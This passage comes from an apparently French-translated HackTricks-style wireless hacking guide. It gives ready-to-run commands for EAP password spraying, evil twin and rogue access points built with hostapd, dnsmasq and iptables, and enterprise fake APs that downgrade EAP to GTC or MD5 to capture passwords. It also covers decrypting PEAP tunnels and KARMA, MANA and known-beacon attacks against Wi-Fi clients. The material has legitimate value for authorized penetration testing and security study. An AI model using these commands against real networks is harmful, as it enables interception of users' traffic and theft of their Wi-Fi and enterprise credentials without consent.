rempla√ßant le Nom d'utilisateur anonyme du message RADIUS entrant. Lorsque la m√©thode d'authentification prot√©g√©e est PAP ou CHAP (prise en charge uniquement par TTLS), les attributs Nom d'utilisateur et autres attributs d'authentification extraits de la charge utile TLS sont substitu√©s dans le message RADIUS sortant, rempla√ßant le Nom d'utilisateur anonyme et les attributs EAP-Message TTLS trouv√©s dans la demande RADIUS entrante.

Pour plus d'informations, consultez [https://www.interlinknetworks.com/app\_notes/eap-peap.htm](https://www.interlinknetworks.com/app\_notes/eap-peap.htm)

### EAP-Bruteforce (password spray)

Si le client est cens√© utiliser un **nom d'utilisateur et un mot de passe** (remarquez que **EAP-TLS ne sera pas valide** dans ce cas), alors vous pourriez essayer d'obtenir une **liste** de **noms d'utilisateur** (voir la prochaine partie) et de **mots de passe** et essayer de **forcer l'acc√®s** en utilisant [**air-hammer**](https://github.com/Wh1t3Rh1n0/air-hammer)**.**
```bash
./air-hammer.py -i wlan0 -e Test-Network -P UserPassword1 -u usernames.txt
```
Vous pourriez √©galement effectuer cette attaque en utilisant `eaphammer` :
```bash
./eaphammer --eap-spray \
--interface-pool wlan0 wlan1 wlan2 wlan3 wlan4 \
--essid example-wifi \
--password bananas \
--user-list users.txt
```
## Th√©orie des attaques client

### S√©lection du r√©seau et itin√©rance

Bien que le protocole 802.11 ait des r√®gles tr√®s sp√©cifiques qui dictent comment une station peut rejoindre un ESS, il ne sp√©cifie pas comment la station devrait s√©lectionner un ESS auquel se connecter. De plus, le protocole permet aux stations de se d√©placer librement entre les points d'acc√®s partageant le m√™me ESSID (car vous ne voudriez pas perdre la connectivit√© WiFi en vous d√©pla√ßant d'une extr√©mit√© √† l'autre d'un b√¢timent, etc). Cependant, le protocole 802.11 ne sp√©cifie pas comment ces points d'acc√®s devraient √™tre s√©lectionn√©s. De plus, m√™me si les stations doivent s'authentifier aupr√®s de l'ESS pour s'associer √† un point d'acc√®s, le protocole 802.11 ne n√©cessite pas que le point d'acc√®s soit authentifi√© aupr√®s de la station.

### Listes de r√©seaux pr√©f√©r√©s (PNL)

Chaque fois qu'une station se connecte √† un r√©seau sans fil, l'ESSID du r√©seau est stock√© dans la liste de r√©seaux pr√©f√©r√©s (PNL) de la station. La PNL est une liste ordonn√©e de tous les r√©seaux auxquels la station s'est connect√©e dans le pass√©, et chaque entr√©e dans la PNL contient l'ESSID du r√©seau et toute information de configuration sp√©cifique au r√©seau n√©cessaire pour √©tablir une connexion.

### Balayage passif

Dans les r√©seaux d'infrastructure, les points d'acc√®s transmettent p√©riodiquement des trames de balise pour annoncer leur pr√©sence et leurs capacit√©s aux stations √† proximit√©. Les balises sont des trames diffus√©es, ce qui signifie qu'elles sont destin√©es √† √™tre re√ßues par toutes les stations √† proximit√© dans la port√©e. Les balises incluent des informations sur les taux pris en charge par l'AP, les capacit√©s de chiffrement, des informations suppl√©mentaires, et surtout, les trames de balise contiennent l'ESSID de l'AP (tant que la diffusion de l'ESSID n'est pas d√©sactiv√©e).

Pendant le balayage passif, le p√©riph√©rique client √©coute les trames de balise des points d'acc√®s √† proximit√©. Si le p√©riph√©rique client re√ßoit une trame de balise dont le champ ESSID correspond √† un ESSID de la PNL du client, le client se connectera automatiquement au point d'acc√®s qui a envoy√© la trame de balise. Ensuite, supposons que nous voulions cibler un p√©riph√©rique sans fil qui n'est pas actuellement connect√© √† un r√©seau sans fil. Si nous connaissons au moins une entr√©e dans la PNL de ce client, nous pouvons forcer le client √† se connecter √† nous simplement en cr√©ant notre propre point d'acc√®s avec l'ESSID de cette entr√©e.

### Exploration active

Le deuxi√®me algorithme de s√©lection de r√©seau utilis√© dans le 802.11 est connu sous le nom d'exploration active. Les p√©riph√©riques clients qui utilisent l'exploration active transmettent continuellement des trames de demande de sondage pour d√©terminer quels AP sont √† port√©e, ainsi que quelles sont leurs capacit√©s. Les demandes de sondage se pr√©sentent sous deux formes : dirig√©es et diffus√©es. Les demandes de sondage dirig√©es sont adress√©es √† un ESSID sp√©cifique, et c'est la mani√®re pour le client de v√©rifier si un r√©seau sp√©cifique est √† proximit√©.

Les clients qui utilisent l'exploration dirig√©e enverront des demandes de sondage pour chaque r√©seau de leur PNL. Il convient de noter que l'exploration dirig√©e est la seule fa√ßon d'identifier la pr√©sence de r√©seaux cach√©s √† proximit√©. Les demandes de sondage diffus√©es fonctionnent presque exactement de la m√™me mani√®re, mais sont envoy√©es avec le champ SSID d√©fini sur NULL. Cela adresse la demande de sondage diffus√©e √† tous les points d'acc√®s √† proximit√©, permettant √† la station de v√©rifier si l'un de ses r√©seaux pr√©f√©r√©s est √† proximit√© sans r√©v√©ler le contenu de sa PNL.

## Simple AP avec redirection vers Internet

Avant d'expliquer comment effectuer des attaques plus complexes, il va √™tre expliqu√© **comment** simplement **cr√©er** un **AP** et **rediriger** son **trafic** vers une interface connect√©e **√†** Internet.

En utilisant `ifconfig -a`, v√©rifiez que l'interface wlan pour cr√©er l'AP et l'interface connect√©e √† Internet sont pr√©sentes.

### DHCP & DNS
```bash
apt-get install dnsmasq #Manages DHCP and DNS
```
Cr√©ez un fichier de configuration _/etc/dnsmasq.conf_ comme suit :
```
interface=wlan0
dhcp-authoritative
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
```
Ensuite, **d√©finissez les adresses IP** et les **routes** :
```
ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
```
Et ensuite **d√©marrer** dnsmasq :
```
dnsmasq -C dnsmasq.conf -d
```
### hostapd
```
apt-get install hostapd
```
Cr√©ez un fichier de configuration _hostapd.conf:_
```
interface=wlan0
driver=nl80211
ssid=MITIWIFI
hw_mode=g
channel=11
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=mitmwifi123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_group_rekey=86400
ieee80211n=1
wme_enabled=1
```
**Arr√™tez les processus g√™nants**, activez le **mode monitor**, et **d√©marrez hostapd**:
```
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
hostapd ./hostapd.conf
```
### Redirection et Renvoi
```bash
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan0 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward
```
## Jumeau Mal√©fique

Une attaque de jumeau mal√©fique est un type d'attaque Wi-Fi qui fonctionne en exploitant le fait que la plupart des ordinateurs et t√©l√©phones ne voient que le "nom" ou l'ESSID d'un r√©seau sans fil (car la station de base n'est pas tenue de s'authentifier contre le client). Cela rend en fait tr√®s difficile de distinguer entre des r√©seaux portant le m√™me nom et le m√™me type de chiffrement. En fait, de nombreux r√©seaux auront plusieurs points d'acc√®s √©tendant le r√©seau, tous utilisant le m√™me nom pour √©tendre l'acc√®s sans perturber les utilisateurs.

En raison du fonctionnement des clients (rappelez-vous que le protocole 802.11 permet aux stations de se d√©placer librement entre les points d'acc√®s au sein du m√™me ESS), il est possible de faire en sorte qu'un appareil change de station de base √† laquelle il est connect√©. Cela est possible en offrant un meilleur signal (ce qui n'est pas toujours possible) ou en bloquant l'acc√®s √† la station de base d'origine (paquets de d√©authentification, brouillage ou toute autre forme d'attaque de d√©ni de service).

Notez √©galement que les d√©ploiements sans fil du monde r√©el ont g√©n√©ralement plus d'un seul point d'acc√®s, et ces points d'acc√®s sont souvent plus puissants et ont une meilleure port√©e en ligne de mire en raison de leur placement vers le plafond. D√©authentifier un seul point d'acc√®s entra√Æne g√©n√©ralement le d√©placement de la cible vers un autre point d'acc√®s valide plut√¥t que vers votre AP malveillant, sauf si tous les points d'acc√®s √† proximit√© sont d√©authentifi√©s (bruyants) ou si vous √™tes tr√®s prudent dans le placement de l'AP malveillant (difficile).

Vous pouvez cr√©er un Jumeau Mal√©fique Ouvert tr√®s basique (sans capacit√© de routage du trafic vers Internet) en faisant :
```bash
airbase-ng -a 00:09:5B:6F:64:1E --essid "Elroy" -c 1 wlan0mon
```
Vous pouvez √©galement cr√©er un Twin Mal√©fique en utilisant **eaphammer** (remarquez que pour cr√©er des twins mal√©fiques avec eaphammer, l'interface **NE DOIT PAS √™tre** en mode **monitor**):
```
./eaphammer -i wlan0 --essid exampleCorp --captive-portal
```
Ou en utilisant Airgeddon : `Options : 5,6,7,8,9 (√† l'int√©rieur du menu d'attaque Evil Twin).`

![](<../../.gitbook/assets/image (148).png>)

Veuillez noter que par d√©faut, si un ESSID dans la PNL est enregistr√© comme prot√©g√© par WPA, le p√©riph√©rique ne se connectera pas automatiquement √† un faux point d'acc√®s ouvert. Vous pouvez essayer de faire une attaque de d√©ni de service sur le vrai AP et esp√©rer que l'utilisateur se connecte manuellement √† votre faux point d'acc√®s ouvert, ou vous pourriez faire une attaque de d√©ni de service sur le vrai AP et utiliser un faux point d'acc√®s WPA pour capturer le handshake (en utilisant cette m√©thode, vous ne pourrez pas laisser la victime se connecter √† vous car vous ne connaissez pas la PSK, mais vous pouvez capturer le handshake et essayer de le craquer).

_Certains syst√®mes d'exploitation et antivirus avertiront l'utilisateur que se connecter √† un r√©seau ouvert est dangereux..._

### Faux point d'acc√®s WPA/WPA2

Vous pouvez cr√©er un **Faux point d'acc√®s en utilisant WPA/2** et si les appareils sont configur√©s pour se connecter √† cet SSID avec WPA/2, ils vont essayer de se connecter. Cependant, **pour compl√©ter le 4-way-handshake**, vous devez √©galement **conna√Ætre** le **mot de passe** que le client va utiliser. Si vous ne le **connaissez pas**, la **connexion ne sera pas compl√©t√©e**.
```
./eaphammer -i wlan0 -e exampleCorp -c 11 --creds --auth wpa-psk --wpa-passphrase "mywifipassword"
```
### Faux point d'acc√®s d'entreprise

Pour comprendre ces attaques, je recommanderais de lire d'abord la br√®ve [explication sur WPA Enterprise](./#wpa-enterprise-mgt).

**Utilisation de hostapd-wpe**

`hostapd-wpe` a besoin d'un fichier de **configuration** pour fonctionner. Pour **automatiser** la g√©n√©ration de ces configurations, vous pourriez utiliser [https://github.com/WJDigby/apd\_launchpad](https://github.com/WJDigby/apd\_launchpad) (t√©l√©chargez le fichier python √† l'int√©rieur de _/etc/hostapd-wpe/_).
```
./apd_launchpad.py -t victim -s PrivateSSID -i wlan0 -cn company.com
hostapd-wpe ./victim/victim.conf -s
```
Dans le fichier de configuration, vous pouvez s√©lectionner diff√©rentes choses telles que le ssid, le canal, les fichiers utilisateur, cret/cl√©, les param√®tres dh, la version wpa et l'auth...

[**Utilisation de hostapd-wpe avec EAP-TLS pour permettre √† n'importe quel certificat de se connecter.**](evil-twin-eap-tls.md)

**Utilisation d'EAPHammer**
```bash
# Generate Certificates
./eaphammer --cert-wizard

# Launch Attack
./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds
```
Par d√©faut, EAPHammer propose ces m√©thodes d'authentification (remarquez que GTC est le premier √† essayer d'obtenir des mots de passe en clair, suivi de l'utilisation de m√©thodes d'authentification plus robustes) :
```
GTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,TTLS-PAP,TTLS-MSCHAP,MD5
```
Ceci est la m√©thodologie par d√©faut pour √©viter les longs temps de connexion. Cependant, vous pouvez √©galement sp√©cifier au serveur les m√©thodes d'authentification de la plus faible √† la plus forte:
```
--negotiate weakest
```
Ou vous pouvez √©galement utiliser :

* `--negotiate gtc-downgrade` pour utiliser une impl√©mentation de r√©trogradation GTC hautement efficace (mots de passe en clair)
* `--negotiate manual --phase-1-methods PEAP,TTLS --phase-2-methods MSCHAPV2,GTC,TTLS-PAP` pour sp√©cifier manuellement les m√©thodes offertes (en offrant les m√™mes m√©thodes d'authentification dans le m√™me ordre que l'organisation, l'attaque sera beaucoup plus difficile √† d√©tecter).
* [Trouvez plus d'informations dans le wiki](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)

**Utilisation d'Airgeddon**

`Airgeddon` peut utiliser des certificats g√©n√©r√©s pr√©c√©demment pour offrir une authentification EAP aux r√©seaux WPA/WPA2-Entreprise. Le faux r√©seau r√©trograde le protocole de connexion en EAP-MD5 afin de **capturer l'utilisateur et le MD5 du mot de passe**. Plus tard, l'attaquant peut essayer de craquer le mot de passe.\
`Airggedon` vous offre la possibilit√© d'une **attaque Evil Twin continue (bruyante)** ou de **cr√©er uniquement l'attaque Evil jusqu'√† ce que quelqu'un se connecte (discr√®te).**

![](<../../.gitbook/assets/image (129).png>)

### D√©bogage des tunnels TLS PEAP et EAP-TTLS dans les attaques Evil Twins

_Cette m√©thode a √©t√© test√©e dans une connexion PEAP mais comme je d√©chiffre un tunnel TLS arbitraire, cela devrait √©galement fonctionner avec EAP-TTLS_

√Ä l'int√©rieur de la **configuration** de _hostapd-wpe_, **commentez** la ligne contenant _**dh\_file**_ (de `dh_file=/etc/hostapd-wpe/certs/dh` √† `#dh_file=/etc/hostapd-wpe/certs/dh`)\
Cela fera en sorte que `hostapd-wpe` **√©change les cl√©s en utilisant RSA** au lieu de DH, vous pourrez donc **d√©chiffrer** le trafic ult√©rieurement en **connaissant la cl√© priv√©e du serveur**.

Maintenant, lancez l'**Evil Twin** en utilisant **`hostapd-wpe`** avec cette configuration modifi√©e comme d'habitude. D√©marrez √©galement **`wireshark`** sur l'**interface** qui effectue l'attaque Evil Twin.

Maintenant ou plus tard (lorsque vous avez d√©j√† captur√© quelques tentatives d'authentification), vous pouvez ajouter la cl√© priv√©e RSA √† wireshark dans : `Edit --> Preferences --> Protocols --> TLS --> (RSA keys list) Edit...`

Ajoutez une nouvelle entr√©e et remplissez le formulaire avec ces valeurs : **Adresse IP = any** -- **Port = 0** -- **Protocole = data** -- **Fichier cl√©** (**s√©lectionnez votre fichier cl√©**, pour √©viter les probl√®mes, s√©lectionnez un fichier cl√© **non prot√©g√© par mot de passe**).

![](<../../.gitbook/assets/image (151).png>)

Et regardez l'onglet **"TLS d√©chiffr√©"** :

![](<../../.gitbook/assets/image (152).png>)

## Attaque KARMA, MANA, Loud MANA et beacons connus

### Listes noires/blanches ESSID et MAC

Le tableau suivant r√©pertorie les diff√©rents types de MFACL (Listes de contr√¥le d'acc√®s aux trames de gestion) disponibles, ainsi que leurs effets lorsqu'ils sont utilis√©s :

![](<../../.gitbook/assets/image (149).png>)
```
# example EAPHammer MFACL file, wildcards can be used
78:f0:97:fc:b5:36
9a:35:e1:01:4f:cf
69:19:14:60:20:45
ce:52:b8:*:*:*

[--mac-whitelist /path/to/mac/whitelist/file.txt #EAPHammer whitelisting]
[--mac-blacklist /path/to/mac/blacklist/file.txt #EAPHammer blacklisting]
```

```
# example ESSID-based MFACL file
apples
oranges
grapes
pears

[--ssid-whitelist /path/to/mac/whitelist/file.txt]
[--ssid-blacklist /path/to/mac/blacklist/file.txt]
```
### KARMA

Les attaques Karma sont une deuxi√®me forme d'attaque de point d'acc√®s frauduleux qui exploite le processus de s√©lection de r√©seau utilis√© par les stations. Dans un document technique r√©dig√© en 2005, Dino Dai Zovi et Shane Macaulay d√©crivent comment un attaquant peut configurer un point d'acc√®s pour √©couter les demandes de sondage dirig√©es et y r√©pondre avec des r√©ponses de sondage dirig√©es correspondantes. Cela am√®ne les stations affect√©es √† envoyer automatiquement une demande d'association au point d'acc√®s de l'attaquant. Le point d'acc√®s r√©pond ensuite avec une r√©ponse d'association, amenant les stations affect√©es √† se connecter √† l'attaquant.

### MANA

Selon Ian de Villiers et Dominic White, les stations modernes sont con√ßues pour se prot√©ger contre les attaques Karma en ignorant les r√©ponses de sondage dirig√©es des points d'acc√®s qui n'ont pas d√©j√† r√©pondu √† au moins une demande de sondage de diffusion. Cela a entra√Æn√© une baisse significative du nombre de stations vuln√©rables aux attaques Karma jusqu'en 2015, lorsque White et de Villiers ont d√©velopp√© un moyen de contourner de telles protections. Dans l'attaque Karma am√©lior√©e de White et de Villiers (attaque MANA), les r√©ponses de sondage dirig√©es sont utilis√©es pour reconstruire les PNL des stations voisines. Lorsqu'une demande de sondage de diffusion est re√ßue d'une station, le point d'acc√®s de l'attaquant r√©pond avec un SSID arbitraire provenant de la PNL de la station d√©j√† vue dans un sondage direct de ce p√©riph√©rique.

En r√©sum√©, l'algorithme MANA fonctionne comme suit : chaque fois que le point d'acc√®s re√ßoit une demande de sondage, il d√©termine d'abord s'il s'agit d'un sondage de diffusion ou dirig√©. S'il s'agit d'un sondage dirig√©, l'adresse MAC de l'exp√©diteur est ajout√©e au tableau de hachage (si elle n'y est pas d√©j√†) et l'ESSID est ajout√© √† la PNL de ce p√©riph√©rique. Le point d'acc√®s r√©pond ensuite avec une r√©ponse de sondage dirig√©e. S'il s'agit d'un sondage de diffusion, le point d'acc√®s r√©pond avec des r√©ponses de sondage pour chacun des r√©seaux dans la PNL de ce p√©riph√©rique.

Attaque MANA utilisant eaphammer:
```
./eaphammer -i wlan0 --cloaking full --mana --mac-whitelist whitelist.txt [--captive-portal] [--auth wpa-psk --creds]
```
### Loud MANA

Notez que l'attaque MANA standard ne nous permet toujours pas d'attaquer les appareils qui n'utilisent pas du tout de sondage dirig√©. Donc, si nous ne connaissons pas non plus √† l'avance une entr√©e dans le PNL de l'appareil, nous devons trouver un autre moyen de l'attaquer.

Une possibilit√© est ce qu'on appelle l'attaque Loud MANA. Cette attaque repose sur l'id√©e que les appareils clients √† proximit√© les uns des autres ont probablement au moins quelques entr√©es communes dans leurs PNL.

En r√©sum√©, l'attaque Loud MANA au lieu de r√©pondre aux demandes de sondage avec chaque ESSID dans le PNL d'un appareil particulier, l'AP malveillant envoie des r√©ponses de sondage pour chaque ESSID dans chaque PNL de tous les appareils qu'il a d√©j√† vus. En relation avec la th√©orie des ensembles, nous pouvons dire que l'AP envoie des r√©ponses de sondage pour chaque ESSID dans l'union de tous les PNL des appareils √† proximit√©.
```
./eaphammer -i wlan0 --cloaking full --mana --loud [--captive-portal] [--auth wpa-psk --creds]
```
### Attaque de Beacon connue

Il existe encore des cas o√π l'attaque Loud MANA ne r√©ussira pas. L'attaque de Beacon connue est une fa√ßon de "Brute-Force" les ESSIDs pour essayer de faire en sorte que la victime se connecte √† l'attaquant. L'attaquant cr√©e un AP qui r√©pond √† n'importe quel ESSID et ex√©cute un code envoyant des balises en imitant les ESSIDs de chaque nom dans une liste de mots. Esp√©rons que la victime contiendra certains de ces noms d'ESSID dans son PNL et tentera de se connecter au faux AP. Eaphammer a impl√©ment√© cette attaque en tant qu'attaque MANA o√π tous les ESSIDs dans une liste sont charg√©s (vous pouvez √©galement combiner cela avec `--loud` pour cr√©er une attaque Loud MANA + Beacon connue) :
```
./eaphammer -i wlan0 --mana [--loud] --known-beacons  --known-ssids-file wordlist.txt [--captive-portal] [--auth wpa-psk --creds]
```
**Attaque de rafale de balises connue**

Comme les balises connues sont bruyantes. Vous pouvez utiliser un script √† l'int√©rieur du projet Eaphammer pour simplement lancer des balises de chaque nom ESSID contenu dans un fichier tr√®s rapidement. Si vous combinez ce script avec une attaque MANA Eaphammer, les clients pourront se connecter √† votre point d'acc√®s.
```
# transmit a burst of 5 forged beacon packets for each entry in list
./forge-beacons -i wlan1 \
--bssid de:ad:be:ef:13:37 \
--known-essids-file known-s.txt \
--dst-addr 11:22:33:11:22:33 \
--burst-count 5
```
## Wi-Fi Direct

Wi-Fi Direct est une norme Wi-Fi qui permet aux appareils de se connecter entre eux sans point d'acc√®s sans fil car l'un des deux appareils agira en tant que point d'acc√®s (appel√© propri√©taire de groupe). Vous pouvez trouver le Wi-Fi Direct dans de nombreux appareils IoT comme les imprimantes, les t√©l√©viseurs...

Le Wi-Fi Direct repose sur la configuration Wi-Fi Protected Setup (**WPS**) pour connecter les appareils de mani√®re s√©curis√©e. WPS propose plusieurs m√©thodes de configuration telles que la Configuration par **Bouton-Poussoir** (PBC), la saisie de **PIN**, et la **Communication en Champ Proche** (NFC).

Ainsi, les attaques pr√©c√©demment observ√©es sur le PIN WPS sont √©galement valables ici si le PIN est utilis√©.

### D√©tournement EvilDirect

Cela fonctionne comme un Evil-Twin mais pour le Wi-Fi direct, vous pouvez vous faire passer pour un propri√©taire de groupe pour essayer de faire connecter d'autres appareils comme des t√©l√©phones √† vous : `airbase-ng -c 6 -e DIRECT-5x-BRAVIA -a BB:BB:BB:BB:BB:BB mon0`

## R√©f√©rences

* [https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee](https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee)
* [https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9](https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9)
* [https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38](https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38)
* [https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d](https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d)
* [https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf](https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf)
* [http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)
* [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
* [https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d](https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d)

TODO: Jetez un ≈ìil √† [https://github.com/wifiphisher/wifiphisher](https://github.com/wifiphisher/wifiphisher) (connexion avec Facebook et imitation de WPA sur les portails captifs)

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Rejoignez le serveur [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) pour communiquer avec des hackers exp√©riment√©s et des chasseurs de primes en s√©curit√© !

**Perspectives sur le Hacking**\
Plongez dans du contenu qui explore les d√©fis et l'excitation du hacking

**Actualit√©s Hacking en Temps R√©el**\
Restez inform√© sur le monde du hacking √† travers des actualit√©s en temps r√©el

**Derni√®res Annonces**\
Tenez-vous inform√© des derni√®res primes de bugs lanc√©es et des mises √† jour cruciales de la plateforme

**Rejoignez-nous sur** [**Discord**](https://discord.com/invite/N3FrSbmwdy) et commencez √† collaborer avec les meilleurs hackers d√®s aujourd'hui !

<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
